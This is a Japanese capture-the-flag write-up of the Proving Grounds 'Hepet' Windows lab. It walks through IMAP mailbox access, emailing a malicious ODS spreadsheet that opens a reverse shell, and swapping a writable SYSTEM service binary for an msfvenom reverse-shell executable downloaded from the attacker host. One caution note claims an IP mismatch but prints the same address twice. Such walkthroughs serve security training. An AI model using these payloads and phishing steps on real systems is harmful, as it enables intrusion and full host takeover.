+++
title = "Proving Grounds Practice - Hepet Writeup"
date = "2026-10-30"
description = "Anonymous FTPとIMAPメールから認証情報を発見し、悪意のあるODSファイルを利用して初期アクセスを取得。Veyonサービスの実行ファイルを差し替えてSYSTEM権限を取得する"
tags = ["Proving Grounds Practice", "CTF", "[Windows]", "[Hepet]", "[FTP]", "[IMAP]", "[SMTP]", "[Credential Discovery]", "[LibreOffice]", "[Initial Access]", "[Service Misconfiguration]", "[Privilege Escalation]", "[Very Hard]"]
categories = ["Proving Grounds Practice"]
toc = true
draft = false
+++

## Machine Info

| Field | Details |
|-------|---------|
| Machine | Hepet |
| OS | Windows（確認できたビルド: 10.0.19042.1348） |
| Target IP | 192.168.195.140 |


---

## Reconnaissance

### Nmap Scan

まず、対象ホストに対して全TCPポートのスキャンとサービス検出を実行する。

```bash
nmap -sV -sC -p- 192.168.195.140
```

主な結果は以下のとおり。

```text
PORT      STATE SERVICE        VERSION
25/tcp    open  smtp           Mercury/32 smtpd
79/tcp    open  finger         Mercury/32 fingerd
105/tcp   open  ph-addressbook Mercury/32 PH addressbook server
106/tcp   open  pop3pw         Mercury/32 poppass service
110/tcp   open  pop3           Mercury/32 pop3d
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
143/tcp   open  imap           Mercury/32 imapd 4.62
443/tcp   open  ssl/http       Apache httpd 2.4.46
445/tcp   open  microsoft-ds?
2224/tcp  open  http           Mercury/32 httpd
5040/tcp  open  unknown
8000/tcp  open  http           Apache httpd 2.4.46
11100/tcp open  vnc            VNC (protocol 3.8)
20001/tcp open  ftp            FileZilla ftpd 0.9.41 beta
33006/tcp open  mysql          MariaDB 10.3.24 or later
```

対象はWindowsホストであり、複数のメール関連サービスに加えて、Apache、FTP、VNC、MariaDBが稼働している。

特に注目した点は以下のとおり。

- `25/tcp`、`110/tcp`、`143/tcp` でメール関連サービスが公開されている。
- `20001/tcp` のFTPではAnonymousログインが許可されている。
- `443/tcp` と `8000/tcp` ではApache 2.4.46とPHP 7.3.23が確認できる。
- `2224/tcp` ではMercury/32のHTTPサービスが稼働している。

メールサービスとAnonymous FTPから情報を取得できる可能性があるため、これらを重点的に調査する。

### Anonymous FTP

Nmapの結果から、FTPへのAnonymousログインが許可されていることが分かった。

FTP上には `package.json`、`README.md`、`src`、`build`、`config`、`static` などのファイル・ディレクトリが存在していた。

```text
ftp-anon: Anonymous FTP login allowed
-r--r--r-- 1 ftp ftp 425010 Oct 20 2020 package-lock.json
-r--r--r-- 1 ftp ftp   2454 Oct 20 2020 package.json
-r--r--r-- 1 ftp ftp   1100 Oct 20 2020 README.md
drwxr-xr-x 1 ftp ftp      0 Oct 20 2020 src
drwxr-xr-x 1 ftp ftp      0 Oct 20 2020 build
drwxr-xr-x 1 ftp ftp      0 Oct 20 2020 config
drwxr-xr-x 1 ftp ftp      0 Oct 20 2020 static
```

Webアプリケーションらしきファイル群を取得できる状態だった。今回のログでは、これらのファイルから直接認証情報を得た記録はないため、初期アクセスにつながった情報源とは区別しておく。

---

## Credential Discovery

### IMAP Login

続いて、IMAPサービスに接続した。

```bash
nc -nv 192.168.195.140 143
```

ログインを試したところ、次の認証情報で成功した。

```text
a login jonas@localhost SicMundusCreatusEst
a OK LOGIN completed.
```

この時点で、以下の認証情報が得られた。

| Field | Value |
|-------|-------|
| Username | `jonas@localhost` |
| Password | `SicMundusCreatusEst` |

ログイン後、INBOXに保存されたメールを列挙した。

```text
a LIST "" "*"
a SELECT INBOX
a FETCH 1 BODY[]
a FETCH 2:5 (BODY.PEEK[])
```

INBOXには5件のメールが存在していた。

### Email Enumeration

メールの内容から、攻撃経路につながる重要な情報が得られた。

#### 1. Weak Password

`mailadmin@localhost` からJonas宛てに送られたメールには、次の内容が記載されていた。

```text
Hey Jonas,

Please change your password, you cannot use the same password as your one liner description, just dont.

Thanks!
```

このメールは、Jonasのパスワードが自己紹介文の一文（one-liner description）と同じである可能性を示している。取得済みのパスワード `SicMundusCreatusEst` とも関連する手掛かりである。

#### 2. LibreOfficeへの移行

別のメールには、文書やスプレッドシートをメールサーバー側でLibreOfficeを使って処理し、互換性を確認する予定であると記載されていた。

```text
We will be changing our office suite to LibreOffice.
For the moment, all the spreadsheets and documents will be first procesed
in the mail server directly to check the compatibility.

I will forward all the documents after checking everything is working okay.
```

この内容から、メールに添付されたOffice文書が処理される仕組みが、初期アクセスの手掛かりになると考えた。

#### 3. 連絡先スプレッドシートの依頼

Agnesからのメールには、会社の連絡先一覧を印刷するため、mailadminへスプレッドシートを送ってほしいという依頼があった。

```text
If you can please send to mailadmin the spreadsheet for printing
with all the company contacts will be really appreciated.
```

さらに、Elaに対してOfficeスイートのインストールを依頼する記述もあった。これらのメールを合わせると、スプレッドシートを利用するワークフローが実際に存在することが分かる。

---

## Initial Access

### Malicious ODS File

メールの内容から、LibreOfficeで処理されるスプレッドシートを利用する方針を立てた。

ログでは、`MMG-LO` の `mmg-ods.py` を使ってWindows向けのリバースシェルペイロードを含むODSファイルを生成している。

```bash
python3 mmg-ods.py windows 192.168.45.155 443
```

生成時の出力：

```text
[+] Payload: windows reverse shell
[+] Creating malicious .ods file

Done.
```

この操作で `file.ods` が作成された。

### Sending the Attachment

作成したODSファイルを、SMTPサービスを通じてmailadmin宛てに送信した。

```bash
sendemail -f 'jonas@localhost' \
  -t 'mailadmin@localhost' \
  -s 192.168.195.140:25 \
  -u 'spreadsheet' \
  -m 'Here is your requested spreadsheet' \
  -a file.ods
```

メール本文は、依頼されたスプレッドシートを送付するという内容にしている。先に確認したメールのやり取りと、LibreOfficeで文書を処理する運用が攻撃の足掛かりとなった。

> **注意:** 送信コマンドのSMTP接続先は `192.168.195.140` と記録されている一方、Nmapの対象IPは `192.168.195.140` である。環境の記録に不一致があるため、再現時には実際のラボ環境のIPアドレスを確認すること。

### Reverse Shell

Kali側で443番ポートの接続を待ち受ける。

```bash
nc -lvnp 443
```

メール処理後、対象ホストから接続が確立した。

```text
listening on [any] 443 ...
connect to [192.168.45.155] from (UNKNOWN) [192.168.195.140] 49730
whoami
hepet\ela arwel
PS C:\Program Files\LibreOffice\program>
```

これにより、`hepet\ela arwel` としてWindows上でコマンドを実行できるシェルを取得した。

この時点のユーザーはSYSTEMではなく、`Ela Arwel` である。次に、サービス設定と実行ファイルのアクセス権を調べ、権限昇格の可能性を探る。

---

## Privilege Escalation

### Enumerating Services

自動起動サービスの実行ファイルパスを調査する。

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto"
```

その後、`Veyon Service` の設定を確認した。

```cmd
sc qc veyonservice
```

結果：

```text
SERVICE_NAME: veyonservice
TYPE               : 10  WIN32_OWN_PROCESS
START_TYPE         : 2   AUTO_START
ERROR_CONTROL      : 1   NORMAL
BINARY_PATH_NAME   : C:\Users\Ela Arwel\Veyon\veyon-service.exe
DISPLAY_NAME       : Veyon Service
SERVICE_START_NAME : LocalSystem
```

重要なのは、`veyonservice` が自動起動に設定されており、`LocalSystem` アカウントとして動作する点である。また、実行ファイルが `C:\Users\Ela Arwel\Veyon\` 配下に置かれている。

### Checking File Permissions

サービス実行ファイルのアクセス許可を確認する。

```cmd
icacls "C:\Users\Ela Arwel\Veyon\veyon-service.exe"
```

結果：

```text
C:\Users\Ela Arwel\Veyon\veyon-service.exe NT AUTHORITY\SYSTEM:(I)(F)
                                           BUILTIN\Administrators:(I)(F)
                                           HEPET\Ela Arwel:(I)(F)
```

`Ela Arwel` にフルコントロール権限 `(F)` が付与されている。つまり、現在のユーザーが、SYSTEMとして起動するサービスの実行ファイルを変更できる状態だった。

この設定不備を利用し、サービス実行ファイルを差し替える方針を取った。

### Replacing the Service Binary

まず、リバースシェル用の実行ファイルを生成した。

```bash
msfvenom -p windows/shell_reverse_tcp \
  LHOST=192.168.45.155 LPORT=4445 \
  -f exe -o veyon-service.exe
```

生成したファイルをHTTP経由で対象ホストに転送する。

```powershell
iwr -uri http://192.168.45.155:80/veyon-service.exe -Outfile veyon-service.exe
```

元のサービス実行ファイルをバックアップ名に変更し、生成したファイルを同じ名前に配置した。

```powershell
move "C:\Users\Ela Arwel\Veyon\veyon-service.exe" "C:\Users\Ela Arwel\Veyon\veyon-service.bak"
move veyon-service.exe "C:\Users\Ela Arwel\Veyon\veyon-service.exe"
```

この操作により、サービスが参照する実行ファイルのパスは維持したまま、実体を置き換えた。

### Restarting the Host and Obtaining SYSTEM

Kali側で4445番ポートの待ち受けを開始する。

```bash
nc -lvnp 4445
```

その後、対象ホストを再起動した。

```powershell
shutdown /r
```

再起動後、待ち受け側で接続を確認した。

```text
listening on [any] 4445 ...
connect to [192.168.45.155] from (UNKNOWN) [192.168.195.140] 49669
Microsoft Windows [Version 10.0.19042.1348]
```

取得したシェルで実行ユーザーを確認する。

```cmd
whoami
```

結果：

```text
nt authority\system
```

これにより、SYSTEM権限でのコマンド実行に成功した。

---

## Summary

今回のHepetでは、メールサービスに保存されていた情報と、Windowsサービスの設定不備を組み合わせて侵入を進めた。

まず、Anonymous FTPで公開されているファイル群を確認した後、IMAPに `jonas@localhost` としてログインし、メールを調査した。メールにはパスワードに関するヒントと、文書をLibreOfficeで処理する運用が記載されていた。

この情報をもとにODSファイルを作成してメールで送信したところ、`hepet\ela arwel` のリバースシェルを取得できた。続いて `veyonservice` を調査すると、サービスは `LocalSystem` として自動起動する一方、実行ファイルに `Ela Arwel` のフルコントロール権限が設定されていた。

サービス実行ファイルをリバースシェル用の実行ファイルに差し替え、ホストを再起動することで、最終的に `NT AUTHORITY\SYSTEM` のシェルを取得した。

### 攻略の流れ

1. Nmapによるポート・サービス列挙
2. Anonymous FTPで公開ファイルを確認
3. IMAPにログインし、メールを列挙
4. メールからLibreOfficeによる文書処理の運用を把握
5. `MMG-LO` で悪意のあるODSファイルを生成
6. SMTPでODSファイルを送信
7. `hepet\ela arwel` のリバースシェルを取得
8. `veyonservice` の設定と実行ファイルのアクセス権を確認
9. SYSTEM権限で実行されるサービスのバイナリを差し替え
10. ホスト再起動後、`NT AUTHORITY\SYSTEM` のシェルを取得

### Lessons Learned

- Anonymous FTPやメールサービスから、認証情報や内部運用に関する手掛かりが漏えいすることがある。
- メールサーバーが受信したOffice文書を自動処理する場合、添付ファイルの検証と実行環境の分離が重要となる。
- 高権限で動作するWindowsサービスの実行ファイルを、一般ユーザーが変更できる権限設定は危険である。
- サービスの実行ファイルや関連ディレクトリには、管理者以外が不必要に書き込めないアクセス許可を設定する必要がある。
- 再現手順を記録する際は、対象IPとリバースシェル接続元として表示されたIPの差異など、ログ上の不一致を確認しておく。
